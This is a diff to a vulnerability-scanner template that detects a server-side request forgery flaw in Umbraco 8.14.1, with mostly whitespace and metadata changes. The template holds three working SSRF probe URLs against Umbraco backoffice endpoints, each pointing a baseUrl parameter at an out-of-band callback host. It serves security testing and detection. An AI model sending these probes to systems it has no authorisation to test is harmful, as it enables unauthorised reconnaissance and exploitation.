@@ -1,5 +1,4 @@
 id: umbraco-base-ssrf
-
 info:
   name: Umbraco 8.14.1 - baseUrl Server-Side Request Forgery (SSRF)
   author: dhiyaneshDk
@@ -12,31 +11,26 @@ info:
     cvss-score: 6.8
     cwe-id: CWE-918
   metadata:
-    runzero-review: REJECT/2025-11-07/uses interactsh
-    verified: true
+    runzero-match: service["http.body"] matches "(?i)Umbraco"
     max-request: 3
     shodan-query: http.html:"Umbraco"
+    verified: true
   tags: oast,edb,ssrf,umbraco,vuln
-
 http:
   - method: GET
     path:
       - '{{BaseURL}}/umbraco/BackOffice/Api/Help/GetContextHelpForPage?section=content&tree=undefined&baseUrl=http://{{interactsh-url}}'
       - '{{BaseURL}}/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardContent?section=TryToAvoidGetCacheItem111&baseUrl=http://{{interactsh-url}}/'
       - '{{BaseURL}}/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardCss?section=AvoidGetCacheItem&baseUrl=http://{{interactsh-url}}/'
-
     stop-at-first-match: true
-
     matchers-condition: and
     matchers:
       - type: word
         part: interactsh_protocol # Confirms the HTTP Interaction
         words:
           - "http"
-
       - type: dsl
         dsl:
           - "len(body_1)==0"
           - "len(body_2)==0"
           - "len(body_3)==0"
-
